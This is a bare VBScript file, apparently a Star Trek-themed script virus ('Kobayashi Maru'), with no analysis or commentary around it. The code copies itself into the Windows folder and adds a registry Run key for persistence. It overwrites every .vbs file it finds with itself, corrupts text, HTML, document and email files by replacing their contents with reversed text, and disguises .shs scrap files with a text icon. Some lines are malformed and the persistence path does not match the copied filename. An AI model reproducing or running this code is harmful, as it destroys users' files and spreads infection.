On Error Resume Next
Randomize
Dim S,R,Enterprise,RipRegF,RipRegD,RipRegX
S="Kobayashi Maru"
R="ST:TOS"
Set Enterprise=CreateObject("WScript.Shell")
Enterprise.RegWrite"HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\","Kobayashi Maru"
Enterprise.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner",S @ t @ n
Enterprise.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","Kobayashi Maru"
Set RipRegF=CreateObject("Scripting.FileSystemObject")
Set RipRegD=RipRegF.GetSpecialFolder(0)
Set RipRegX=RipRegF.GetFile(WScript.ScriptFullName)
RipRegX.Copy RipRegD&"\Maru.drv.vbs"
RipRegF.CopyFile "Demonik.Txt.shs",RipRegD&"\Kobayashi.Txt.shs"
Call GetFolder(RipRegD)
Call GetFolder(RipRegD&"\Desktop")
Call GetFolder("C:\Mis Documentos")
Call GetFolder(RipRegD&"\Escritorio")
Call GetFolder("C:\My Documents")
Call GetFolder(RipRegD&"\Web")
Call GetFolder(RipRegD&"\Ayuda")
Call GetFolder(RipRegD&"\Help")
Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
Call GetFolder("C:\Archivos de Programa\Internet Explorer\Asistente para la conexión a Internet")
Call GetFolder("C:\Inetpub\wwwroot")
Call Dem0n!k(RipRegD&"\Kobayashi_List.txt")

Sub GetFolder(vIp)
On Error Resume Next
If RipRegF.FolderExists(vIp) Then
Do
Set CptKirk=RipRegF.GetFolder(vIp)
vIp=RipRegF.GetParentFolderName(vIp)
Set MrSpock=CptKirk.Files
For Each Uhura In MrSpock
  Chekov=LCase(RipRegF.GetExtensionName(Uhura.Name))
  If Chekov="vbs" Then
     Set Scooty=RipRegF.OpenTextFile(WScript.ScriptFullName,1)
     Bones=Scooty.Size
     Ikaru=Scooty.Read(Bones)
     Scooty.Close()
     Set Scooty.OpenTextFile(Uhura.Name,2)
     Scooty.Write(Ikaru)
     Scooty.Close()
  Else
     If Chekov="txt" Or Chekov="html" Or Chekov="htm" Or Chekov="htt" Or Chekov="url" Or Chekov="eml" Or Chekov="doc" Or Chekov="rtf" Then
        Set Scooty=RipRegF.OpenTextFile(Uhura.Path,1,False)
        If Scooty.ReadLine<>R&" by: "&S Then
           Scooty.Close()
           GetFile(Uhura.Path)
        Else
           Scooty.Close()
        End If
     End If
Next
Loop Until MrSpock.IsRootFolder=True
End If
End Sub

Sub GetFile(Khan)
 Set Scooty=RipRegF.GetFile(Khan)
 Scooty.Attributes=0
 NCC1701=Scooty.Size
 Set Scooty=RipRegF.OpenTextFile(Khan,1,False)
 RedShirt=Scooty.Read(NCC1701)
 Scooty.Close()
 Set Scooty=RipRegF.OpenTextFile(Khan,2,False)
 Scooty.WriteLine(R&" by: "&S)
 StarDate=StrReverse(RedShirt)
 Scooty.Write(StarDate)
 Scooty.Close()
End Sub

Sub Dem0n!k(FN)
If Not (RipRegF.FileExists(RipRegD&"\Kobayashi_List.txt")) Then
  Set Scooty=RipRegF.CreateTextFile(FN,2,False)
  Scooty.WriteBlankLines(2)
  Scooty.WriteLine("Be Yonki            -   http://www.yonkis.com")
  Scooty.WriteLine("Be FresonManiac     -   http://www.fresonmagic.com")
  Scooty.WriteLine("Be TorbeFAN         -   http://www.putalocura.com")
  Scooty.Close()
  Enterprise.Run(FN)
End If
End Sub

Dim M1
Dim S
I=""
I=Enterprise.RegRead("HKEY_CLASSES_ROOT\"&Enterprise.RegRead("HKEY_CLASSES_ROOT\.txt")&"\DefaultIcon\")
If I<>"" Then Enterprise.RegWrite"HKEY_CLASSES_ROOT\ShellScrap\DefaultIcon",I
Enterprise.RegWrite"HKEY_CLASSES_ROOT\txtfile\AlwaysShowExt",""
Enterprise.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\KobayashiMaru","WScript.exe "&RipRegD&"\Kobayashi.drv.vbs"
